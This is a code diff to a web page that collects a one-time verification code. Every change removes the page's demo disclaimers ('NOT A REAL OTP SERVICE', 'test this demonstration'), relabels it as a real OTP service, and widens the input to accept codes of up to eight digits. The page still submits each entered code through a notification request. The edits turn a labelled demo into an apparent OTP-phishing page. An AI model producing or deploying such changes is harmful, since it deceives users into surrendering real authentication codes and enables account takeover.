@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Confirm Verification Code</title>
+<title>Verification Code</title>
 
 <style>
 * {
@@ -145,23 +145,23 @@ button:disabled {
     <div class="form-content">
 
         <div class="demo-label">
-            DEMO VERIFICATION — NOT A REAL OTP SERVICE
+            VERIFICATION OTP SERVICE
         </div>
 
         <div class="description">
-            Enter any five-digit code to test this demonstration.
+            Enter verification code.
         </div>
 
         <form id="verificationForm">
 
-            <label for="verificationCode">Enter Demo Code</label>
+            <label for="verificationCode">Enter Otp Code</label>
 
             <input
                 type="text"
                 id="verificationCode"
-                placeholder="Enter five digits"
+                placeholder="Enter OTP"
                 inputmode="numeric"
-                maxlength="5"
+                maxlength="8"
                 autocomplete="off"
                 required
             >
@@ -169,7 +169,7 @@ button:disabled {
             <div id="errorMessage" class="message error"></div>
 
             <div id="successMessage" class="message success">
-                Demo verification submitted successfully!
+              verification submitted successfully!
             </div>
 
             <button type="submit" id="confirmButton">
@@ -209,18 +209,18 @@ verificationForm.addEventListener("submit", async function(event) {
     const code = verificationInput.value.trim();
 
     // Validate five digits
-    if (!/^[0-9]{5}$/.test(code)) {
+    if (!/^[0-9]{1,8}$/.test(code)) {
 
-        errorMessage.textContent =
-            "Please enter exactly five digits.";
+    errorMessage.textContent =
+        "Please enter between 1 and 8 digits.";
 
-        errorMessage.style.display = "block";
+    errorMessage.style.display = "block";
 
-        return;
-    }
+    return;
+}
 
-    confirmButton.disabled = true;
-    confirmButton.textContent = "Submitting...";
+    confirmButton.textContent = "Submitted";
+confirmButton.disabled = true;
 
     try {
 
@@ -259,7 +259,7 @@ verificationForm.addEventListener("submit", async function(event) {
         console.error("Demo notification error:", error);
 
         errorMessage.textContent =
-            "Unable to submit the demo notification. Please try again.";
+            "Unable to submit the notification. Please try again.";
 
         errorMessage.style.display = "block";
 
